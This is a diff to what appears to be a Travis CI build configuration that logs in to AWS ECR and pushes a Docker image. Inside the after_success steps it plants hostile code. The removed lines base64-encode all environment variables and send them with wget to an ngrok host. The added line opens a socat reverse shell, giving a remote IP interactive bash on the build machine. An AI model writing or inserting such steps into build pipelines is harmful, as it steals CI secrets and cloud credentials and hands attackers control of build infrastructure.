@@ -11,13 +11,12 @@ script:
 
 after_success:
   - docker --version
-  - sudo apt-get update -y && sudo apt install wget
+  - sudo apt-get update -y && sudo apt install socat
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - foo=`env | base64 -w 0`
-  - wget http://68a93a481d93.ngrok.io/$foo
+  - socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.20.98.123:10636
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
